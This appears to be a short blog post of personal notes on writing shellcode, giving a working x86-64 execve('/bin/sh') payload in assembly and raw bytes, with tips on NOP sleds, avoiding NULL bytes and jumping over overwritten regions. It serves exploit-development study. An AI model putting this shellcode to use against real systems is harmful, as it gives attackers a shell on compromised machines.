---
layout: post
title: "Shellcoding Notes"
---

Shellcode is useless with NX mitigation, but still good to know.

## execve shellcode

```
xor esi, esi
movabs rbx, 0x68732f2f6e69622f
push rsi
push rbx
push rsp
pop rdi
push 0x3b
pop rax
xor edx, edx
syscall

---

raw bytes: "\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05"
```

```0x3b``` is the syscall number for ```execve```. Second argument is zeroed out (```rsi```), and "/bin/sh\0" string is pushed onto the stack. Then, the address of the top of the stack is popped into ```rdi``` as the first argument.

## NOP-sled

Sometimes you have to write the no-op instruction (```0x90```) in the buffer before your shellcode is executed.

## NULL byte
If the buffer is copied with functions like ```strcpy```, they will stop on the ```NULL``` byte. To get rid of it, try using 4 byte (or 2/1 byte) instructions, or ```push/pop``` instructions for storing values.

## Overwrite mangling
If the program writes over the shellcode, use a ```jmp $+n``` to jump over the overwrite section.
